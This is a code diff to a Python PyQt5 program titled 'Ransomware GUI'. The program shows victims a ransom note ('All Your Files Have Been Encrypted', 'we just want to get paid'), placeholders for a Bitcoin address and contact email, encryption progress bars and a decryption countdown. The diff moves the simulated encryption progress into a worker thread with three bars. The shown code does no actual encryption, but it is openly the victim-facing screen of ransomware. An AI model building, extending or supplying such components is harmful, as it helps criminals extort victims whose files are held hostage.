@@ -1,7 +1,28 @@
 import sys
 from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QVBoxLayout, QWidget, QProgressBar
 from PyQt5.QtGui import QIcon
-from PyQt5.QtCore import Qt, QTimer
+from PyQt5.QtCore import Qt, QTimer, QObject, pyqtSignal, QThread
+
+class Worker(QObject):
+    progress_updated_1 = pyqtSignal(int)
+    progress_updated_2 = pyqtSignal(int)
+    progress_updated_3 = pyqtSignal(int)
+
+    def run(self):
+        # Simulate encryption progress for the first progress bar
+        for i in range(101):
+            self.progress_updated_1.emit(i)
+            QThread.msleep(100)  # Simulate work (sleep for 100 milliseconds)
+
+        # Simulate progress for the second progress bar
+        for j in range(101):
+            self.progress_updated_2.emit(j)
+            QThread.msleep(100)
+
+        # Simulate progress for the third progress bar
+        for k in range(101):
+            self.progress_updated_3.emit(k)
+            QThread.msleep(100)
 
 class RansomwareGUI(QMainWindow):
     def __init__(self):
@@ -11,7 +32,7 @@ class RansomwareGUI(QMainWindow):
         self.btcAdd = ""
         self.email = ""
 
-        # Define ransom notess
+        # Define ransom note
         self.ransomNote = f"""
         All Your Files Have Been Encrypted\n
         At the end of the day we just want to get paid\n
@@ -40,7 +61,7 @@ class RansomwareGUI(QMainWindow):
         self.setCentralWidget(central_widget)
 
         # Create layout
-        layout = QVBoxLayout(central_widget)
+        self.layout = QVBoxLayout(central_widget)
 
         # Set the background color of the central widget to black
         central_widget.setStyleSheet("background-color: #000000;")
@@ -61,7 +82,7 @@ class RansomwareGUI(QMainWindow):
                 margin-bottom: 20px;
             }
         """)
-        layout.addWidget(banner_label)
+        self.layout.addWidget(banner_label)
 
         # Add stylish ransom note label with a red block background
         self.ransom_note_label = QLabel(self.ransomNote)
@@ -78,12 +99,12 @@ class RansomwareGUI(QMainWindow):
                 margin: 20px 0;
             }
         """)
-        layout.addWidget(self.ransom_note_label)
+        self.layout.addWidget(self.ransom_note_label)
 
-        # Add encryption progress bar
-        self.encryption_progress = QProgressBar(self)
-        self.encryption_progress.setGeometry(10, 10, 180, 30)
-        layout.addWidget(self.encryption_progress)
+        # Add encryption progress bars
+        self.progress_bars = [QProgressBar(self) for _ in range(3)]
+        for progress_bar in self.progress_bars:
+            self.layout.addWidget(progress_bar)
 
         # Add continue button with hover effect
         continue_button = QPushButton('Continue', self)
@@ -99,26 +120,45 @@ class RansomwareGUI(QMainWindow):
                 background-color: #9b0000;
             }
         """)
-        layout.addWidget(continue_button)
+        self.layout.addWidget(continue_button)
         continue_button.clicked.connect(self.hide)
 
         # Set up window properties
         self.setGeometry(100, 100, 800, 600)
         self.setWindowTitle('Ransomware GUI')
-        self.setWindowIcon(QIcon('path/to/icon.png'))  # Replace with your icon path
+        # Replace with your icon path
+        self.setWindowIcon(QIcon('path/to/icon.png'))
+
         self.show()
 
     def startEncryptionProgress(self):
-        self.encryption_timer = QTimer(self)
-        self.encryption_timer.timeout.connect(self.updateEncryptionProgress)
-        self.encryption_timer.start(1000)  # Update progress every second
+        # Create a worker thread
+        self.worker_thread = QThread()
 
-    def updateEncryptionProgress(self):
-        # Implement your logic to update the encryption progress
-        # For example, increase the value of the progress bar
-        current_value = self.encryption_progress.value()
-        new_value = min(current_value + 10, 100)  # Increase by 10% each time
-        self.encryption_progress.setValue(new_value)
+        # Move the worker object to the thread
+        self.worker = Worker()
+        self.worker.moveToThread(self.worker_thread)
+
+        # Connect signals between the worker and GUI
+        self.worker.progress_updated_1.connect(self.updateEncryptionProgress1)
+        self.worker.progress_updated_2.connect(self.updateEncryptionProgress2)
+        self.worker.progress_updated_3.connect(self.updateEncryptionProgress3)
+
+        # Start the thread
+        self.worker_thread.started.connect(self.worker.run)
+        self.worker_thread.start()
+
+    def updateEncryptionProgress1(self, value):
+        # Update the first progress bar
+        self.progress_bars[0].setValue(value)
+
+    def updateEncryptionProgress2(self, value):
+        # Update the second progress bar
+        self.progress_bars[1].setValue(value)
+
+    def updateEncryptionProgress3(self, value):
+        # Update the third progress bar
+        self.progress_bars[2].setValue(value)
 
     def startDecryptionCountdown(self):
         self.decryption_timer = QTimer(self)
@@ -134,6 +174,12 @@ class RansomwareGUI(QMainWindow):
         minutes, seconds = divmod(remainder, 60)
         countdown_str = f"Decryption Countdown: {hours:02}:{minutes:02}:{seconds:02}"
         self.ransom_note_label.setText(self.ransomNote + "\n" + countdown_str)
+
+    def closeEvent(self, event):
+        # Clean up and stop the worker thread when the GUI is closed
+        self.worker_thread.quit()
+        self.worker_thread.wait()
+        event.accept()
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
